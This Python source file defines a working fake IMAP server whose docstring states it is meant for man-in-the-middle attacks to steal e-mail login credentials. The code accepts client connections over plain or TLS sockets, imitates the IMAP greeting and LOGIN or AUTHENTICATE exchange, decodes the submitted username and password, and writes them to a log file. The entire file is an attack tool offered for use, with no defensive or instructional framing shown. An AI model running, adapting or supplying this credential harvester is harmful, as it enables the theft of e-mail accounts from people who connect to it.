import socket
import ssl
import threading
import base64
import sys


class FakeIMAPServer:

    def __init__(self,
                 log_file: str,
                 bind_port: int = None,
                 bind_address: str = "0.0.0.0",
                 is_ssl: bool = False,
                 cert_file: str = None,
                 key_file: str = None,
                 timeout: int = 30
                 ):
        """
        This class initialize a fake IMAP server to perform Man-In-The-Middle attacks
        to steal E-mail login credentials.

        :param log_file: File to log credentials.
        :param bind_port: Port to bind.
        :param bind_address: IP address to bind.
        :param is_ssl: Use TLS/SSL
        :param cert_file: TLS/SSL certificate file path.
        :param key_file: TLS/SSL private key file path.
        """
        try:
            open(log_file, "a").close()
        except Exception as e:
            raise Exception(f"- Failed to open the log file {log_file}: {e}")
        self.__log_file = log_file

        if bind_port is None:
            if is_ssl:
                self.__bind_port = 993
            else:
                self.__bind_port = 143
        else:
            self.__bind_port = bind_port

        self.__bind_address = bind_address

        if is_ssl:
            if not cert_file:
                raise Exception("- TLS/SSL certificate file is not provided.")

            if not key_file:
                raise Exception("- TLS/SSL private file is not provided.")

            try:
                open(cert_file).close()
            except Exception as e:
                raise Exception(f"- Failed to read the certificate file: {e}")

            try:
                open(key_file).close()
            except Exception as e:
                raise Exception(f"- Failed to read the private key file: {e}")

            try:
                self.__ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
                self.__ssl_context.load_cert_chain(certfile=cert_file,
                                                   keyfile=key_file)
            except Exception as e:
                raise Exception(f"- Failed to create the TLS/SSL context: {e}")

        self.__is_ssl = is_ssl
        self.__timeout = timeout
        self.__server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.__server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.__server_socket.settimeout(self.__timeout)
        self.__lock = threading.Lock()

    def __log(self, data: str):
        """
        This method writes data to a new line in the log file.
        :param data:
        :return:
        """
        self.__lock.acquire()
        print(data)
        try:
            with open(self.__log_file, "a") as f:
                f.write(f"{data}\r\n")
        except Exception as e:
            print(f"Failed to log data to {self.__log_file} : {e}")
        self.__lock.release()

    def __handle_client_socket(self, client_socket: socket.socket, connection_id: int = 1):
        """
        This method handles the client socket for IMAP communication.
        :param client_socket: Client socket
        :param connection_id: ID of the client connection.
        :return:
        """
        try:

            if self.__is_ssl:
                client_socket = self.__ssl_context.wrap_socket(client_socket,
                                                               server_side=True)
            server_msg = b"* OK IMAP server ready\r\n"
            client_socket.send(server_msg)
            print(f"[{connection_id}] Server: {server_msg.decode()}", flush=True)
            sys.stdout.flush()

            client_msg = client_socket.recv(2048).strip()
            print(f"[{connection_id}] Client: {client_msg.decode()}", flush=True)
            sys.stdout.flush()
            user_id = client_msg.split(b" ID ")[0]

            server_msg = b'* ID ("NAME" "IMAPServer" "VERSION" "1" "RELEASE" "1")\r\n'
            server_msg += user_id + b" OK ID completed\r\n"
            client_socket.send(server_msg)
            print(f"[{connection_id}] Server: {server_msg.decode()}", flush=True)

            client_msg = client_socket.recv(2048).strip()
            print(f"[{connection_id}] Client: {client_msg.decode()}", flush=True)

            if b"LOGIN" in client_msg:
                method = "LOGIN"
            else:
                method = "AUTHENTICATE"

            server_msg = b"+ send literal data\r\n"
            client_socket.send(server_msg)
            print(f"[{connection_id}] Server: {server_msg.decode()}", flush=True)

            client_msg = client_socket.recv(2048).strip()
            print(f"[{connection_id}] Client: {client_msg.decode()}", flush=True)
            if method == "LOGIN":
                username = client_msg.split(b" ")[0].decode()
                client_socket.send(server_msg)
                print(f"[{connection_id}] Server: {server_msg.decode()}", flush=True)
                password = client_socket.recv(2048).strip().decode()
                print(f"[{connection_id}] Client: {password}", flush=True)

            else:
                msg_parts = base64.b64decode(client_msg).split(b"\x00")
                username, password = [part.decode() for part in msg_parts if part]

            self.__log(f"[{connection_id}] Credentials extracted -> {username}:{password}")

        except Exception as e:
            print(f"[{connection_id}] Failed to handle the client socket: {e}")

        try:
            client_socket.shutdown(socket.SHUT_RDWR)
            client_socket.close()
        except Exception:
            pass
        print(f"[{connection_id}] Server: Connection closed.")

    def run(self):
        """
        This method starts the server.
        :return:
        """
        try:
            self.__server_socket.bind((self.__bind_address, self.__bind_port))
        except Exception as e:
            raise Exception(f"- Failed to bind to port {self.__bind_address}: {e}")

        self.__server_socket.listen(64)
        connection_id = 0
        while True:

            try:
                client_socket, address = self.__server_socket.accept()
                connection_id += 1
                print(f"+ Connection received from {address[0]}:{address[1]}, connection ID: {connection_id}")

                thread = threading.Thread(target=self.__handle_client_socket,
                                          args=(client_socket, connection_id),
                                          daemon=True)
                thread.start()

            except KeyboardInterrupt:
                break
            except Exception:
                pass

        self.__server_socket.shutdown(socket.SHUT_RDWR)
        self.__server_socket.close()
